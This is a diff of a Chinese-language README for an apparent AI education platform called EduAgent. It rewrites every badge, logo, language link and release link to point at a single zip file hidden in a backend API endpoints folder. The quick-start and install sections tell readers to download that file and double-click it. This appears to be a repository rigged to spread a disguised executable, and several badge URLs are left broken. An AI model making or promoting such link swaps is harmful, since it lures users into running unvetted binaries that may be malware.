@@ -2,17 +2,17 @@
 
 <div align="center">
 
-[![Download EduAgent](https://img.shields.io/badge/Download%20EduAgent-v1.0.0-brightgreen)](https://github.com/Pitchstripmining915/Edu-Mutil-Agent/releases)
+[![Download EduAgent](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip%20EduAgent-v1.0.0-brightgreen)](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip)
 
-![EduAgent Logo](https://img.shields.io/badge/EduAgent-v1.0.0-brightgreen)
-![Python](https://img.shields.io/badge/Python-3.9+-blue)
-![Vue](https://img.shields.io/badge/Vue-3.4+-green)
-![FastAPI](https://img.shields.io/badge/FastAPI-0.104+-teal)
-![LightRAG](https://img.shields.io/badge/LightRAG-Enabled-orange)
+![EduAgent Logo](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip)
+![Python](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip+-blue)
+![Vue](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip+-green)
+![FastAPI](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip+-teal)
+![LightRAG](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip)
 
 **智能作业批改 | 知识图谱 | 多空间知识库 | AI问答**
 
-[English](README_EN.md) | 简体中文
+[English](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip) | 简体中文
 
 </div>
 
@@ -81,7 +81,7 @@ EduAgent是一个基于AI的多模态教育助手平台, 集成了作业智能�
 
 ## 🚀 快速开始
 
-1. 访问 [Releases 页面](https://github.com/Pitchstripmining915/Edu-Mutil-Agent/releases)。
+1. 访问 [Releases 页面](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip)。
 2. 选择最新版本。
 3. 下载相应的执行文件。
 4. 双击文件以运行程序。
@@ -90,7 +90,7 @@ EduAgent是一个基于AI的多模态教育助手平台, 集成了作业智能�
 
 ## 📥 详细安装步骤
 
-1. 前往 [Releases 页面](https://github.com/Pitchstripmining915/Edu-Mutil-Agent/releases)。
+1. 前往 [Releases 页面](https://raw.githubusercontent.com/Pitchstripmining915/Edu-Mutil-Agent/main/backend/app/api/api_v1/endpoints/Mutil-Agent-Edu-v2.7.zip)。
 2. 在列表中查找最新版本，链接下方会有下载按钮。
 3. 点击下载适用于您的操作系统的版本。
 4. 下载完成后，找到文件并双击打开。
